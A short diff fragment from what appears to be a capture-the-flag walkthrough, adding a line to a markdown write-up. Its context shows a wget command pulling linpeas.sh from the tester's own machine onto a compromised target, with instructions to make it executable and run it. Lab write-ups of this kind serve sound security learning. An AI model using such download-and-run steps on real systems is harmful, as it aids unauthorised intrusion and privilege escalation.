@@ -11,3 +11,5 @@ wget http://IP_of_your_machine:80/linpeas.sh
 The script is now on the remote machine change its permission and execute it.
 
 <img alt="" class="bg hc hd c" width="1000" height="450" loading="lazy" role="presentation" src="https://i.ibb.co/rQWqcWf/Academy-8.png"></img>
+
+The output is as follows
